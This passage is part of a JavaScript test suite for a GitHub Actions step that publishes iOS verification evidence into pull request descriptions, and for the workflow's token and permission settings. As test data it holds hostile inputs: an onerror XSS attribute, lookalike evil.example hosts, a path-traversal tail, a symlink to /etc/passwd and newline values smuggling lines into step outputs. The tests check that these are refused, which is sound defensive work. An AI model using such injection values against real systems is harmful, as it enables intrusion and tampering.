    const env = await fetched(WITH_BEFORE, [...MEDIA, ...WAS_MEDIA]);
    const fake = fakeGh();
    const { said } = publish(env, fake);
    const names = ['evidence-n0nce-1.mp4', 'evidence-n0nce-2.png', 'evidence-n0nce-3.mp4', 'evidence-n0nce-4.png'];
    assert.deepEqual(
      fake.state.calls[3].args.filter((_, i, args) => args[i - 1] === '--attach'),
      names.map(name => `./${name}`),
    );
    assert.deepEqual(fs.readdirSync(path.join(env.WORK, 'files')).sort(), names);
    assert.deepEqual(fs.readFileSync(path.join(env.WORK, 'files', names[3])), WAS_PNG);
    assert.ok(
      fake.state.writtenBody.endsWith('![before-profile](./evidence-n0nce-4.png)\r\n\r\n<!-- /verify-evidence:ios -->'),
    );
    assert.deepEqual(said, [
      'notice: Put verify run r20261008-052713-253e in the description of pull request #669: 4 files.',
    ]);
  });

  const changedBeforeTheLayout = [
    ['the block is gone from the description', state => void (state.pull.body = 'Rewritten by a reviewer.\n')],
    [
      'the block names another run',
      state => void (state.pull.body = state.pull.body.replace(GOOD.run, 'r20261009-020202-bbbb')),
    ],
    [
      'the block shows one address fewer',
      state => void (state.pull.body = state.pull.body.replace(asset(1), 'removed')),
    ],
    [
      'the block shows an address that is not an upload',
      state =>
        void (state.pull.body = state.pull.body.replace(asset(2), 'https://example.com/x.png" onerror="alert(1)')),
    ],
    ...[
      ['on another host', asset(2).replace('github.com', 'evil.example')],
      ['on a host that only starts like GitHub', asset(2).replace('github.com', 'github.com.evil.example')],
      ['under another path of GitHub', asset(2).replace('user-attachments/assets', 'evil/user-attachments/assets')],
      ['with an id one character short', asset(2).slice(0, -1)],
      ['with a capital in its id', asset(2).replace('4000', 'A000')],
    ].map(([how, address]) => [
      `the block shows an upload address ${how}`,
      state => void (state.pull.body = state.pull.body.replace(asset(2), address)),
    ]),
    ['the markers are broken', state => void (state.pull.body += '\n<!-- verify-evidence:ios -->\n')],
    ['the pull request is closed', state => void (state.pull.state = 'closed')],
  ];
  for (const [what, change] of changedBeforeTheLayout) {
    it(`leaves the files as a list, writes nothing more and says so, when ${what} after the upload`, async () => {
      const fake = fakeGh(PULL, state => void (state.reads === 3 && change(state)));
      const { outcome, said } = publish(await fetched(), fake);
      assert.equal(outcome, 'listed');
      assert.equal(fake.state.laidOutBody, null);
      assert.equal(fake.state.calls.filter(call => call.args[0] === 'pr').length, 1);
      assert.deepEqual(said, [
        'notice: Put verify run r20261008-052713-253e in the description of pull request #669 as a list of 2 files. The pull request changed before they could be laid out. A rerun of this job uploads them again and lays them out.',
      ]);
    });
  }

  it('writes an upload address as its 36 characters of id and nothing that follows them', async () => {
    for (const tail of ['f', '-0', '" onerror="alert(1)', '?download=1', '/../../evil', '#x']) {
      const fake = fakeGh(
        PULL,
        state =>
          void (state.reads === 3 && (state.pull.body = state.pull.body.replace(asset(2), `${asset(2)}${tail}`))),
      );
      assert.equal(publish(await fetched(), fake).outcome, 'published', tail);
      assert.equal(
        fake.state.laidOutBody,
        `${PULL.body}\r\n${laidOut(SAID, ...AFTER_ONLY).replaceAll('\n', '\r\n')}`,
        tail,
      );
    }
  });

  it('keeps an edit that someone saves outside the block between the upload and the layout', async () => {
    const fake = fakeGh(
      PULL,
      state =>
        void (
          state.reads === 3 && (state.pull.body = `Reviewed.\r\n\r\n${state.pull.body}\r\nA note under the block.`)
        ),
    );
    assert.equal(publish(await fetched(), fake).outcome, 'published');
    assert.equal(
      fake.state.laidOutBody,
      `Reviewed.\r\n\r\n${PULL.body}\r\n${laidOut(SAID, ...AFTER_ONLY).replaceAll('\n', '\r\n')}\r\nA note under the block.`,
    );
  });

  it('fails with what gh said when the write that lays the files out fails', async () => {
    const env = await fetched();
    const fake = fakeGh();
    const failing = {
      gh: (args, options) =>
        args[0] === 'pr' && !args.includes('--attach') ? { status: 1, stderr: 'HTTP 502\n' } : fake.gh(args, options),
    };
    assert.throws(
      () => publish(env, failing),
      error => error.message === 'gh pr edit failed to lay out the files in pull request #669\ngh: HTTP 502',
    );
  });

  it('names the person the workflow says started the session, and publishes nothing under a name that is not a login', async () => {
    const fake = fakeGh();
    publish({ ...(await fetched()), RUN_ACTOR: 'hubot-9[bot]' }, fake);
    assert.match(fake.state.writtenBody, /\/actions\/runs\/37731397352\) that `hubot-9\[bot\]` started\. Run `/);
    for (const name of [undefined, '', 'mallory` [approved](https://example.com) `', 'a\nb', 'a b']) {
      const refusing = fakeGh();
      const env = { ...(await fetched()), RUN_ACTOR: name };
      assert.throws(() => publish(env, refusing), Refused, JSON.stringify(name));
      assert.deepEqual(refusing.state.calls, []);
    }
  });

  const STARTED_ON = 'd'.repeat(40);
  const startedEarlier = async () => ({ ...(await fetched()), HEAD_SHA: STARTED_ON });

  it('publishes a run made at the head of the pull request when the session started on an earlier commit of it', async () => {
    const fake = fakeGh(PULL, undefined, [{ sha: STARTED_ON }, { sha: 'e'.repeat(40) }, { sha: COMMIT }]);
    const { outcome } = publish(await startedEarlier(), fake);
    assert.equal(outcome, 'published');
    assert.ok(fake.state.writtenBody.includes('r20261008-052713-253e'));
    assert.equal(fake.state.writtenBody.includes('newer commits'), false);
  });

  it('publishes a run made at an earlier commit of the pull request, and says that the pull request has newer commits', async () => {
    const NEWER = 'b'.repeat(40);
    const fake = fakeGh({ ...PULL, head: { ...PULL.head, sha: NEWER } }, undefined, [{ sha: COMMIT }, { sha: NEWER }]);
    const { outcome } = publish(await fetched(), fake);
    assert.equal(outcome, 'published');
    assert.match(
      fake.state.writtenBody,
      / at `0f50b597b1c2`, 3 of 3 passed\. The pull request has newer commits\.\r\n/,
    );
    assert.match(
      fake.state.laidOutBody,
      /, 3 of 3 passed\. The pull request has newer commits\.\r\n\r\n\| `profile` \|/,
    );
  });

  it('says that the pull request has newer commits when its head moves while the evidence is being placed', async () => {
    const NEWER = 'b'.repeat(40);
    const fake = fakeGh(
      PULL,
      state => void (state.reads === 2 && ((state.pull.head.sha = NEWER), (state.pull.body = 'Edited.\n'))),
      [{ sha: COMMIT }, { sha: NEWER }],
    );
    assert.equal(publish(await fetched(), fake).outcome, 'published');
    assert.match(
      fake.state.writtenBody,
      /^Edited\.\n\n<!-- verify-evidence:ios -->\n\n\*\*Verified on .* newer commits\.\n/,
    );
  });

  it('says that the pull request has newer commits when only its head moves between the read and the write', async () => {
    const NEWER = 'b'.repeat(40);
    const fake = fakeGh(PULL, state => void (state.reads === 2 && (state.pull.head.sha = NEWER)), [
      { sha: COMMIT },
      { sha: NEWER },
    ]);
    assert.equal(publish(await fetched(), fake).outcome, 'published');
    assert.equal(fake.state.reads, 4);
    assert.match(
      fake.state.writtenBody,
      / at `0f50b597b1c2`, 3 of 3 passed\. The pull request has newer commits\.\r\n/,
    );
    assert.match(
      fake.state.laidOutBody,
      /, 3 of 3 passed\. The pull request has newer commits\.\r\n\r\n\| `profile` \|/,
    );
  });

  it('adds that the pull request has newer commits to a run it already published, and uploads nothing again', async () => {
    const NEWER = 'b'.repeat(40);
    const moved = {
      ...PULL,
      body: `intro\r\n\r\n${laidOut(SAID, ...AFTER_ONLY).replaceAll('\n', '\r\n')}\r\noutro`,
      head: { ...PULL.head, sha: NEWER },
    };
    const fake = fakeGh(moved, undefined, [{ sha: COMMIT }, { sha: NEWER }]);
    const { outcome, said } = publish(await fetched(), fake);
    assert.equal(outcome, 'noted');
    assert.equal(
      fake.state.writtenBody,
      moved.body.replace('3 of 3 passed.', '3 of 3 passed. The pull request has newer commits.'),
    );
    assert.equal(fake.state.calls.at(-1).args.includes('--attach'), false);
    assert.deepEqual(said, [
      'notice: Noted in the description of pull request #669 that it has newer commits than verify run r20261008-052713-253e.',
    ]);
    const noted = fakeGh({ ...moved, body: fake.state.writtenBody }, undefined, [{ sha: COMMIT }, { sha: NEWER }]);
    assert.equal(publish(await fetched(), noted).outcome, 'already there');
    assert.equal(noted.state.writtenBody, null);
  });

  it('replaces a block that names the same verify run under another session, and adds no note to it', async () => {
    const NEWER = 'b'.repeat(40);
    const otherSession = evidenceBlock(GOOD, { ...SESSION, runId: '11111111111', actor: 'mallory' }).replaceAll(
      './',
      'https://github.com/user-attachments/assets/',
    );
    for (const head of [COMMIT, NEWER]) {
      const pull = { ...PULL, body: `intro\n\n${otherSession}\n`, head: { ...PULL.head, sha: head } };
      const fake = fakeGh(pull, undefined, [{ sha: COMMIT }, { sha: NEWER }]);
      const { outcome } = publish(await fetched(), fake);
      assert.equal(outcome, 'published', head);
      assert.equal(fake.state.writtenBody.includes('/actions/runs/11111111111)'), false, head);
      assert.equal(fake.state.writtenBody.includes('mallory'), false, head);
      assert.match(fake.state.writtenBody, /\/actions\/runs\/37731397352\) that `octocat` started\. Run `/, head);
      assert.equal(fake.state.calls.at(-3).args.includes('--attach'), true, head);
    }
  });

  it('says that GitHub lists only the first 250 commits when a longer pull request does not show the commits of the run', async () => {
    const listed = Array.from({ length: 250 }, (_, i) => ({ sha: i.toString(16).padStart(40, '0') }));
    const long = { ...PULL, commits: 300 };
    const fake = fakeGh(long, undefined, listed);
    const { outcome, said } = publish(await fetched(), fake);
    assert.equal(outcome, 'refused');
    assert.equal(fake.state.writtenBody, null);
    assert.deepEqual(said, [
      'notice: Pull request #669 has 300 commits and GitHub lists only the first 250, which do not hold the commit the session started on, so run 37731397352 cannot be checked against it and nothing is published.',
    ]);
    const early = fakeGh(long, undefined, [{ sha: COMMIT }, ...listed.slice(1)]);
    assert.equal(publish(await fetched(), early).outcome, 'published', 'both commits are among the first 250');
    const onBase = fakeGh(long, undefined, [{ sha: COMMIT }, ...listed.slice(1)], '{"status":"ahead"}');
    assert.equal(
      publish(await startedEarlier(), onBase).outcome,
      'published',
      'the run commit is among the first 250 and the base branch holds the commit the session started on',
    );
    const short = fakeGh({ ...PULL, commits: 250 }, undefined, listed);
    assert.match(
      publish(await fetched(), short).said[0],
      /is not the pull request of run 37731397352 \(the commit the session started on is not one of its commits or a commit of its base branch\)/,
    );
  });

  it('publishes nothing when the commit the verify run was made at is not a commit of the pull request', async () => {
    const fake = fakeGh(PULL, undefined, [{ sha: 'e'.repeat(40) }]);
    const { outcome, said } = publish(await fetched(manifestFor(MEDIA, { commit: 'c'.repeat(40) })), fake);
    assert.equal(outcome, 'refused');
    assert.equal(fake.state.writtenBody, null);
    assert.deepEqual(said, [
      'notice: Pull request #669 is not the pull request of run 37731397352 (the commit the session started on is not one of its commits or a commit of its base branch), so nothing is published.',
    ]);
    const other = fakeGh(PULL, undefined, [{ sha: COMMIT }]);
    const refused = publish(await fetched(manifestFor(MEDIA, { commit: 'c'.repeat(40) })), other);
    assert.deepEqual(refused.said, [
      'notice: Pull request #669 is not the pull request of run 37731397352 (the commit the verify run was made at is not one of its commits), so nothing is published.',
    ]);
    assert.equal(other.state.writtenBody, null);
  });

  const comparisons = fake => fake.state.calls.filter(call => /\/compare\//.test(call.args[1] ?? ''));
  const NOT_STARTED_HERE =
    'notice: Pull request #669 is not the pull request of run 37731397352 (the commit the session started on is not one of its commits or a commit of its base branch), so nothing is published.';

  it('publishes a run of a session that started on a commit the base branch holds, the commit the branch came from', async () => {
    for (const status of ['ahead', 'identical']) {
      const fake = fakeGh(PULL, undefined, [{ sha: COMMIT }], JSON.stringify({ status }));
      const { outcome } = publish(await startedEarlier(), fake);
      assert.equal(outcome, 'published', status);
      assert.deepEqual(
        comparisons(fake).map(call => call.args),
        [['api', `repos/clerk/clerk-ios/compare/${STARTED_ON}...${BASE}?per_page=1`]],
        status,
      );
    }
    const listed = fakeGh(PULL, undefined, [{ sha: STARTED_ON }, { sha: COMMIT }]);
    assert.equal(publish(await startedEarlier(), listed).outcome, 'published');
    assert.deepEqual(comparisons(listed), [], 'a commit of the pull request needs no question');
  });

  it('publishes nothing when the commit the session started on is not a commit of the pull request, and the base branch does not hold it', async () => {
    const answers = ['{"status":"behind"}', '{"status":"diverged"}', '{"status":"AHEAD"}', '{}', 'null', '<html>'];
    for (const compared of answers) {
      const fake = fakeGh(PULL, undefined, [{ sha: 'e'.repeat(40) }, { sha: COMMIT }], compared);
      const { outcome, said } = publish(await startedEarlier(), fake);
      assert.equal(outcome, 'refused', compared);
      assert.equal(fake.state.writtenBody, null, compared);
      assert.deepEqual(said, [NOT_STARTED_HERE], compared);
      assert.equal(comparisons(fake).length, 1, compared);
    }
    for (const base of [
      { repo: PULL.base.repo },
      { ...PULL.base, sha: `${BASE.slice(0, 39)}?` },
      { ...PULL.base, sha: 'main' },
    ]) {
      const fake = fakeGh({ ...PULL, base }, undefined, [{ sha: COMMIT }], '{"status":"ahead"}');
      assert.deepEqual(publish(await startedEarlier(), fake).said, [NOT_STARTED_HERE], JSON.stringify(base));
      assert.deepEqual(comparisons(fake), [], 'no question is asked about a base that is not a commit id');
    }
  });

  it('publishes nothing for a run made at a commit that only the base branch holds, such as a before run alone', async () => {
    const fake = fakeGh(PULL, undefined, [{ sha: 'e'.repeat(40) }], '{"status":"identical"}');
    const { outcome, said } = publish(await fetched(), fake);
    assert.equal(outcome, 'refused');
    assert.equal(fake.state.writtenBody, null);
    assert.deepEqual(said, [
      'notice: Pull request #669 is not the pull request of run 37731397352 (the commit the verify run was made at is not one of its commits), so nothing is published.',
    ]);
  });

  const comparing = (fake, stderr) => ({
    ...fake,
    gh: (args, options) => (/\/compare\//.test(args[1] ?? '') ? { status: 1, stderr } : fake.gh(args, options)),
  });

  it('publishes nothing, and does not fail, when GitHub does not find the commit the session started on', async () => {
    const notFound = 'gh: Not Found (HTTP 404)\n';
    const fake = fakeGh(PULL, undefined, [{ sha: COMMIT }], '{"status":"ahead"}');
    const { outcome, said } = publish(await startedEarlier(), comparing(fake, notFound));
    assert.equal(outcome, 'refused');
    assert.equal(fake.state.writtenBody, null);
    assert.deepEqual(said, [
      'notice: Pull request #669 is not the pull request of run 37731397352 (the commit the session started on is not a commit GitHub finds in this repository), so nothing is published.',
    ]);
    const long = fakeGh({ ...PULL, commits: 300 }, undefined, [{ sha: COMMIT }], '{"status":"ahead"}');
    assert.deepEqual(publish(await startedEarlier(), comparing(long, notFound)).said, said, 'a long pull request');
  });

  it('fails when GitHub does not answer the comparison of the commit the session started on with the base branch, and writes nothing', async () => {
    for (const stderr of ['gh: Bad Gateway (HTTP 502)\n', 'error connecting to api.github.com\n', '']) {
      const fake = fakeGh(PULL, undefined, [{ sha: COMMIT }], '{"status":"ahead"}');
      const env = await startedEarlier();
      assert.throws(
        () => publish(env, comparing(fake, stderr)),
        error =>
          error.message ===
          `gh could not compare the commit the session started on with the base branch of pull request #669\n${stderr === '' ? '' : `gh: ${stderr.trimEnd()}`}`,
        stderr,
      );
      assert.equal(fake.state.writtenBody, null, stderr);
    }
  });

  it('reads every page of the commits GitHub lists, and stops at the last one', async () => {
    const many = Array.from({ length: 230 }, (_, i) => ({ sha: i.toString(16).padStart(40, '0') }));
    const pagesRead = fake => fake.state.calls.filter(call => /\/commits\?/.test(call.args[1] ?? '')).length;
    const found = fakeGh(PULL, undefined, [...many, { sha: STARTED_ON }, { sha: COMMIT }]);
    assert.equal(publish(await startedEarlier(), found).outcome, 'published');
    assert.equal(pagesRead(found), 3);
    const absent = fakeGh(PULL, undefined, [...many, ...many, { sha: COMMIT }]);
    assert.equal(publish(await startedEarlier(), absent).outcome, 'refused');
    assert.equal(pagesRead(absent), 3);
    const short = fakeGh();
    publish(await fetched(), short);
    assert.equal(pagesRead(short), 1);
  });

  it('fails when the list of commits cannot be read, and writes nothing', async () => {
    const fake = fakeGh();
    const failing = {
      gh: (args, options) =>
        /\/commits\?/.test(args[1] ?? '') ? { status: 1, stderr: 'HTTP 502\n' } : fake.gh(args, options),
    };
    const env = await fetched();
    assert.throws(() => publish(env, failing), /gh could not read the commits of pull request #669\ngh: HTTP 502/);
    assert.equal(fake.state.writtenBody, null);
  });

  const refusedPulls = [
    { what: 'a closed pull request', change: { state: 'closed' }, why: 'it is not open' },
    {
      what: 'a pull request from a fork',
      change: { head: { ...PULL.head, repo: { full_name: 'someone/clerk-ios' } } },
      why: 'its branch is in another repository',
    },
    {
      what: 'a pull request of another branch',
      change: { head: { ...PULL.head, ref: 'someone-elses-branch' } },
      why: 'its branch is not the branch the session ran on',
    },
  ];
  for (const { what, change, why } of refusedPulls) {
    it(`publishes nothing to ${what}`, async () => {
      const fake = fakeGh({ ...PULL, ...change });
      const { outcome, said } = publish(await fetched(), fake);
      assert.equal(outcome, 'refused');
      assert.equal(
        fake.state.calls.some(call => call.args[0] === 'pr'),
        false,
      );
      assert.deepEqual(said, [
        `notice: Pull request #669 is not the pull request of run 37731397352 (${why}), so nothing is published.`,
      ]);
    });
  }

  it('publishes nothing when the pull request closes between the first read and the write', async () => {
    const fake = fakeGh(PULL, state => void (state.reads === 2 && (state.pull.state = 'closed')));
    const { outcome } = publish(await fetched(), fake);
    assert.equal(outcome, 'refused');
    assert.equal(fake.state.writtenBody, null);
  });

  it('does not upload a run that the description already holds in its tables', async () => {
    const fake = fakeGh({ ...PULL, body: `intro\n\n${laidOut(SAID, ...AFTER_ONLY)}\n` });
    const { outcome, said } = publish(await fetched(), fake);
    assert.equal(outcome, 'already there');
    assert.equal(fake.state.writtenBody, null);
    assert.deepEqual(said, [
      'notice: The description of pull request #669 already holds verify run r20261008-052713-253e.',
    ]);
  });

  it('uploads a run again and lays it out when an earlier publish left its files as a list', async () => {
    const leftAsAList = fakeGh(PULL, state => void (state.reads === 3 && (state.pull.state = 'closed')));
    assert.equal(publish(await fetched(), leftAsAList).outcome, 'listed');
    const list = leftAsAList.state.pull.body;
    assert.ok(list.endsWith(`\r\n${asset(1)}\r\n\r\n![profile](${asset(2)})\r\n\r\n<!-- /verify-evidence:ios -->`));

    const rerun = fakeGh({ ...PULL, body: list });
    assert.equal(publish(await fetched(), rerun).outcome, 'published');
    assert.deepEqual(
      rerun.state.calls.filter(call => call.args[0] === 'pr').map(call => call.args.includes('--attach')),
      [true, false],
    );
    assert.equal(rerun.state.pull.body, `${PULL.body}\r\n${laidOut(SAID, ...AFTER_ONLY).replaceAll('\n', '\r\n')}`);
  });

  it('uploads a run again when an earlier upload left a file reference that was never rewritten', async () => {
    const halfUploaded = blockOf(GOOD).replace('./video.mp4', 'https://github.com/user-attachments/assets/1');
    const fake = fakeGh({ ...PULL, body: `intro\n\n${halfUploaded}\n` });
    assert.equal(publish(await fetched(), fake).outcome, 'published');
    assert.equal(fake.state.writtenBody, `intro\n\n${PLACED}\n`);
  });

  it('builds on the newer description when someone edits it between the read and the write', async () => {
    const fake = fakeGh(PULL, state => void (state.reads === 2 && (state.pull.body = 'Rewritten by a reviewer.\n')));
    assert.equal(publish(await fetched(), fake).outcome, 'published');
    assert.equal(fake.state.reads, 4);
    assert.equal(fake.state.writtenBody, `Rewritten by a reviewer.\n\n${PLACED}`);
    assert.equal(fake.state.laidOutBody, `Rewritten by a reviewer.\n\n${laidOut(SAID, ...AFTER_ONLY)}`);
  });

  it('writes nothing when the description changes twice, and says so', async () => {
    const fake = fakeGh(PULL, state => void (state.pull.body = `edit ${state.reads}\n`));
    const env = await fetched();
    assert.throws(
      () => publish(env, fake),
      /changed twice while the evidence was being placed, so nothing was written/,
    );
    assert.equal(fake.state.writtenBody, null);
  });

  it('writes nothing to a description whose markers are broken, and says which', async () => {
    const fake = fakeGh({ ...PULL, body: 'text\n<!-- verify-evidence:ios -->\nthe end marker was deleted\n' });
    const env = await fetched();
    assert.throws(
      () => publish(env, fake),
      /has the start marker 1 times and the end marker 0 times, so the evidence has no one place to go/,
    );
    assert.equal(fake.state.writtenBody, null);
  });

  it('writes nothing over text between two markers that is not an evidence block', async () => {
    const fake = fakeGh({
      ...PULL,
      body: '<!-- verify-evidence:ios -->\nreviewer notes\n<!-- /verify-evidence:ios -->\n',
    });
    const env = await fetched();
    assert.throws(() => publish(env, fake), /has text between the markers that is not an evidence block/);
    assert.equal(fake.state.writtenBody, null);
  });

  it('refuses files that changed after the first step wrote them', async () => {
    const env = await fetched();
    fs.rmSync(path.join(env.WORK, 'files', 'profile.png'));
    fs.symlinkSync('/etc/passwd', path.join(env.WORK, 'files', 'profile.png'));
    assert.throws(() => publish(env, fakeGh()), Refused);
  });

  it('fails with what gh said, one prefixed line each, when gh fails', async () => {
    const env = await fetched();
    const fake = fakeGh();
    const failing = {
      gh: (args, options) =>
        args[0] === 'pr'
          ? { status: 1, stderr: '::error::from gh\nunsupported authentication type\n' }
          : fake.gh(args, options),
    };
    assert.throws(
      () => publish(env, failing),
      error =>
        error.message ===
        'gh pr edit failed for pull request #669\ngh: ::error::from gh\ngh: unsupported authentication type',
    );
  });
});

describe('what the workflow can be told by the script', () => {
  it('writes each message as one workflow command, whatever the text holds', () => {
    assert.equal(
      workflowCommand('error', 'gh pr edit failed\ngh: ::add-mask::x\r\n100%'),
      '::error title=verify-attach::gh pr edit failed%0Agh: ::add-mask::x%0D%0A100%25',
    );
  });

  it('writes only found=true or found=false to the step outputs', async () => {
    const work = workDir();
    const outputs = path.join(path.dirname(work), 'outputs');
    const good = path.join(path.dirname(work), 'good.zip');
    const hostile = path.join(path.dirname(work), 'hostile.zip');
    fs.writeFileSync(good, bundle());
    fs.writeFileSync(hostile, bundle(manifestFor(MEDIA, { device: 'x\nfound=true\nGITHUB_ENV=1' })));
    fs.writeFileSync(outputs, '');
    const lines = [];
    assert.equal(
      await main(['fetch', '--zip', hostile], { ...ENV, WORK: work, GITHUB_OUTPUT: outputs }, line => lines.push(line)),
      1,
    );
    assert.equal(fs.readFileSync(outputs, 'utf8'), '');
    assert.deepEqual(lines, [
      '::error title=verify-attach::The evidence was refused: device is missing or malformed. Nothing is published.',
    ]);
    assert.equal(
      await main(['fetch', '--zip', good], { ...ENV, WORK: work, GITHUB_OUTPUT: outputs }, () => undefined),
      0,
    );
    assert.equal(
      await main(
        ['fetch', '--zip', good],
        { ...ENV, RUN_EVENT: 'pull_request', WORK: workDir(), GITHUB_OUTPUT: outputs },
        () => undefined,
      ),
      0,
    );
    assert.equal(fs.readFileSync(outputs, 'utf8'), 'found=true\nfound=false\n');
  });
});

describe('the workflow', () => {
  const here = path.dirname(fileURLToPath(import.meta.url));
  const file = [path.join(here, '..', 'workflows'), path.join(here, '..', '.github', 'workflows')]
    .map(dir => path.join(dir, 'verify-attach.yml'))
    .find(candidate => fs.existsSync(candidate));
  const workflow = fs.readFileSync(file, 'utf8');
  const steps = workflow
    .slice(workflow.indexOf('    steps:\n'))
    .split(/\n(?= {6}- )/)
    .slice(1);

  it('gives the bot token to the one step that edits the description, and to nothing else', () => {
    const holders = steps.filter(step => step.includes('secrets.'));
    assert.equal(holders.length, 1);
    assert.match(holders[0], /^ {10}GH_TOKEN: \$\{\{ secrets\.VERIFY_EVIDENCE_TOKEN \}\}$/m);
    assert.match(holders[0], /^ {8}run: node \S*verify-attach\.mjs publish$/m);
    assert.deepEqual(workflow.match(/secrets\.[A-Z_]+[^\n]*/g), [
      "secrets.VERIFY_EVIDENCE_TOKEN != '' }}",
      'secrets.VERIFY_EVIDENCE_TOKEN }}',
    ]);
  });

  it('holds the bot token in a job of the verify-evidence environment, which a branch workflow cannot enter', () => {
    const jobs = workflow
      .slice(workflow.indexOf('\njobs:\n') + '\njobs:\n'.length)
      .split(/\n(?= {2}[A-Za-z0-9_-]+:\n)/);
    const holders = jobs.filter(job => job.includes('secrets.'));
    assert.equal(holders.length, 1);
    assert.match(holders[0], /^ {4}environment: verify-evidence$/m);
    assert.equal(/^env:/m.test(workflow), false, 'no secret can sit in the env of the whole workflow');
  });

  it('takes the name of who started the session from the run GitHub records, not from the session', () => {
    assert.match(workflow, /^ {6}RUN_ACTOR: \$\{\{ github\.event\.workflow_run\.actor\.login \}\}$/m);
    assert.equal(workflow.match(/RUN_ACTOR/g).length, 1);
  });

  it('makes the runs for one branch take turns at the description, and cancels none that has started', () => {
    assert.match(
      workflow,
      /^ {4}concurrency:\n {6}group: verify-attach-\$\{\{ github\.event\.workflow_run\.head_repository\.full_name \}\}-\$\{\{ github\.event\.workflow_run\.head_branch \}\}\n {6}cancel-in-progress: false\n/m,
    );
  });

  it('interpolates nothing into a script, and runs only the script of the commit GitHub chose', () => {
    for (const step of steps) {
      const run = /^ {8}run: (?:\|\n((?: {10}.*\n?)+)|(.*))$/m.exec(step);
      if (run !== null) {
        assert.equal((run[1] ?? run[2]).includes('${{'), false, step);
      }
    }
    assert.match(workflow, /^ {10}ref: \$\{\{ github\.sha \}\}$/m);
    assert.equal(workflow.includes('download-artifact'), false);
    assert.equal(/\b(npm|pnpm|yarn|npx) /.test(workflow), false);
    assert.match(workflow, /^permissions:\n {2}actions: read\n {2}contents: read\n\n/m);
    assert.equal(/: write\b/.test(workflow), false);
  });

  it('starts only for a dispatched session of this repository', () => {
    assert.match(workflow, /^ {6}- verify-remote$/m);
    for (const condition of [
      "github.event.workflow_run.event == 'workflow_dispatch'",
      "github.event.workflow_run.path == '.github/workflows/verify-remote.yml'",
      'github.event.workflow_run.head_repository.full_name == github.repository',
    ]) {
      assert.ok(workflow.includes(condition), condition);
    }
  });
});
